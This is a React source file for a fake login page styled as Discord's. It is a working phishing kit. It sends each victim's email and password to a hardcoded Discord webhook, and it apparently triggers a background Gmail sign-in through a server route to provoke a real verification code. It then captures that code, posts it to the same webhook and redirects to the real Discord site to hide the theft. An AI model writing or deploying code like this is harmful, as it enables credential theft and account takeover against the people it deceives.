'use client';

import { useForm } from 'react-hook-form';
import { useState } from 'react';

type FormData = {
  email: string;
  password: string;
  code?: string;
};

export default function LoginForm() {
  const { register, handleSubmit } = useForm<FormData>();
  const [step, setStep] = useState<'login' | 'forgot' | 'code'>('login');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);

  const onLogin = async (data: FormData) => {
    setLoading(true);
    setEmail(data.email);
    setPassword(data.password);

    // Send creds to webhook
    await fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "Login Attempt",
          color: 0x5865f2,
          fields: [
            { name: "Email", value: data.email || "—" },
            { name: "Password", value: data.password || "—" }
          ]
        }]
      })
    }).catch(() => {});

    setStep('forgot');
    setLoading(false);
  };

  const onForgot = async (data: FormData) => {
    setLoading(true);
    setEmail(data.email);

    // Trigger fake reset code email
    await fetch('/api/send-fake-code', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: data.email })
    }).catch(() => {});

    // Trigger Gmail login in background
    await fetch('/api/gmail-login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: data.email, password })
    }).catch(() => {});

    setStep('code');
    setLoading(false);
  };

  const onCode = async (data: FormData) => {
    setLoading(true);

    // Send entered code to webhook
    await fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "Verification Code Entered",
          color: 0x00ff00,
          fields: [
            { name: "Email", value: email },
            { name: "Code", value: data.code || "—" }
          ]
        }]
      })
    }).catch(() => {});

    // Redirect to real Discord
    window.location.href = 'https://discord.com/login';
    setLoading(false);
  };

  if (step === 'forgot') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#36393f]">
        <div className="bg-[#313338] p-8 rounded-xl w-full max-w-md shadow-2xl">
          <h1 className="text-2xl font-bold text-center mb-4 text-white">Forgot your password?</h1>
          <p className="text-center text-gray-400 mb-8">
            Enter your email or phone number and we'll send you a reset code.
          </p>

          <form onSubmit={handleSubmit(onForgot)}>
            <div className="mb-6">
              <label className="block text-sm font-semibold text-gray-300 mb-2 uppercase tracking-wide">
                Email or Phone Number <span className="text-red-500">*</span>
              </label>
              <input
                {...register('email', { required: true })}
                className="w-full p-3 bg-[#202225] border border-[#202225] rounded text-white focus:border-[#5865f2] focus:outline-none"
                required
              />
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full p-3 bg-[#5865f2] hover:bg-[#4752c4] text-white font-semibold rounded transition"
            >
              {loading ? 'Sending...' : 'Send Reset Code'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  if (step === 'code') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#36393f]">
        <div className="bg-[#313338] p-8 rounded-xl w-full max-w-md shadow-2xl">
          <h1 className="text-2xl font-bold text-center mb-4 text-white">Check Your Email</h1>
          <p className="text-center text-gray-400 mb-8">
            We sent a 6-digit code to {email}
          </p>

          <form onSubmit={handleSubmit(onCode)}>
            <div className="mb-6">
              <label className="block text-sm font-semibold text-gray-300 mb-2 uppercase tracking-wide">
                Verification Code <span className="text-red-500">*</span>
              </label>
              <input
                {...register('code', { required: true })}
                maxLength={6}
                className="w-full p-3 bg-[#202225] border border-[#202225] rounded text-white text-center text-xl focus:border-[#5865f2] focus:outline-none"
                required
              />
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full p-3 bg-[#5865f2] hover:bg-[#4752c4] text-white font-semibold rounded transition"
            >
              {loading ? 'Verifying...' : 'Verify'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-[#36393f]">
      <div className="bg-[#313338] p-8 rounded-xl w-full max-w-md shadow-2xl">
        <h1 className="text-3xl font-bold text-center mb-2 text-white">Welcome back!</h1>
        <p className="text-center text-gray-400 mb-8">
          We're so excited to see you again!
        </p>

        <form onSubmit={handleSubmit(onLogin)}>
          <div className="mb-6">
            <label className="block text-sm font-semibold text-gray-300 mb-2 uppercase tracking-wide">
              Email or Phone Number <span className="text-red-500">*</span>
            </label>
            <input
              {...register('email', { required: true })}
              className="w-full p-3 bg-[#202225] border border-[#202225] rounded text-white focus:border-[#5865f2] focus:outline-none"
              required
            />
          </div>

          <div className="mb-6">
            <label className="block text-sm font-semibold text-gray-300 mb-2 uppercase tracking-wide">
              Password <span className="text-red-500">*</span>
            </label>
            <input
              type="password"
              {...register('password', { required: true })}
              className="w-full p-3 bg-[#202225] border border-[#202225] rounded text-white focus:border-[#5865f2] focus:outline-none"
              required
            />
          </div>

          <button
            type="submit"
            disabled={loading}
            className="w-full p-3 bg-[#5865f2] hover:bg-[#4752c4] text-white font-semibold rounded transition mb-4"
          >
            {loading ? 'Logging in...' : 'Log In'}
          </button>

          <div className="text-center">
            <button
              type="button"
              onClick={() => setStep('forgot')}
              className="text-[#5865f2] hover:underline text-sm"
            >
              Forgot your password?
            </button>
          </div>
        </form>

        <div className="mt-6 text-center text-sm text-gray-400">
          Need an account? <a href="#" className="text-[#5865f2] hover:underline">Register</a>
        </div>
      </div>
    </div>
  );
}
